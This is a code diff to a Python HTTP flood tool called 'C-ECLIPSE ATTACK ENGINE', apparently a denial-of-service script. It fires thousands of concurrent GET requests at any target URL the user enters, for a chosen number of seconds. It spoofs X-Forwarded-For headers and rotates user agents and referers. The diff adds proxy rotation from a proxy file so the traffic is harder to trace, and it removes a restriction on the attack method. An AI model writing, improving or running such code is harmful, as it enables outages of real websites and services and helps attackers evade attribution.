@@ -7,8 +7,8 @@ import psutil
 import time
 
 # Constants
-MAX_CONCURRENT = 8000  # High load, optimized for 8 CPUs / 24GB RAM
-REQUEST_TIMEOUT = 10  # Seconds
+MAX_CONCURRENT = 1000
+REQUEST_TIMEOUT = 10
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
@@ -16,13 +16,21 @@ USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
 ]
 
-# Load referers from refs.txt
+# Function to load referers from the file
 def load_referers():
     try:
         with open("refs.txt", "r") as f:
             return [line.strip() for line in f if line.strip()]
     except:
         return ["https://www.google.com/"]
+
+# Function to load proxies from the file
+def load_proxies():
+    try:
+        with open("proxy.txt", "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except:
+        return []
 
 class AttackEngine:
     def __init__(self, method, target, duration):
@@ -31,6 +39,7 @@ class AttackEngine:
         self.duration = duration
         self.start_time = 0
         self.referers = load_referers()
+        self.proxies = load_proxies()
         self.stats = {
             'total': 0,
             'success': 0,
@@ -40,14 +49,21 @@ class AttackEngine:
         }
         self.process = psutil.Process(os.getpid())
 
+    # Function to make the request using proxies
     async def make_request(self, session):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "Referer": random.choice(self.referers),
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
+
+        # Choose proxy if available
+        proxy = None
+        if self.proxies:
+            proxy = random.choice(self.proxies)
+        
         try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
+            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT, proxy=f"http://{proxy}" if proxy else None) as response:
                 if response.status == 200:
                     return "SUCCESS"
                 elif str(response.status).startswith('4'):
@@ -56,6 +72,7 @@ class AttackEngine:
         except:
             return "ERROR"
 
+    # Function to run the attack
     async def run_attack(self):
         self.start_time = time.time()
         end_time = self.start_time + self.duration
@@ -66,26 +83,29 @@ class AttackEngine:
                 tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                 results = await asyncio.gather(*tasks)
 
-                # Stats update
+                # Update stats
                 self.stats['total'] += len(results)
                 self.stats['success'] += results.count("SUCCESS")
                 self.stats['errors'] += results.count("ERROR")
+
+                # Calculate RPS and update peak RPS
                 elapsed = time.time() - self.start_time
                 current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                 self.stats['rps'] = current_rps
                 self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
 
                 self.print_status()
-                await asyncio.sleep(0.01)
+                await asyncio.sleep(0.1)
 
         self.print_summary()
 
+    # Function to print status in the console
     def print_status(self):
-         elapsed = time.time() - self.start_time
+        elapsed = time.time() - self.start_time
         remaining = max(0, self.duration - elapsed)
         ram_used_mb = self.process.memory_info().rss / 1024 / 1024
 
-        sys.stdout.write("\033[H\033[J")  # Clear terminal
+        sys.stdout.write("\033[H\033[J")  # Clear console
         print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
         print("=" * 60)
         print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
@@ -93,9 +113,11 @@ class AttackEngine:
         print(f"TIME REMAINING: {remaining:.1f}s | RAM USED: {ram_used_mb:.2f} MB")
         print("=" * 60)
 
+    # Function to print summary at the end of attack
     def print_summary(self):
         total_time = time.time() - self.start_time
         avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
+
         print("\nATTACK COMPLETED")
         print("=" * 60)
         print(f"TARGET: {self.target}")
@@ -106,22 +128,25 @@ class AttackEngine:
         print(f"AVERAGE RPS: {avg_rps:.1f}")
         print("=" * 60)
 
+# Main function
 def main():
     print("C-ECLIPSE ATTACK ENGINE")
     print("=" * 40)
-    method = input("METHOD: ").strip().upper()
-    if method != "C-ECLIPSE":
-        print("Invalid method. Only C-ECLIPSE is supported.")
-        return
+
+    # Input method (No longer restricted to C-ECLIPSE only)
+    method = input("METHOD: ").strip()
+
     target = input("TARGET: ").strip()
     if not target.startswith(('http://', 'https://')):
         target = "http://" + target
+
     try:
         duration = int(input("TIME (seconds): ").strip())
     except:
         print("Invalid duration.")
         return
 
+    # Start attack engine
     engine = AttackEngine(method, target, duration)
     try:
         asyncio.run(engine.run_attack())
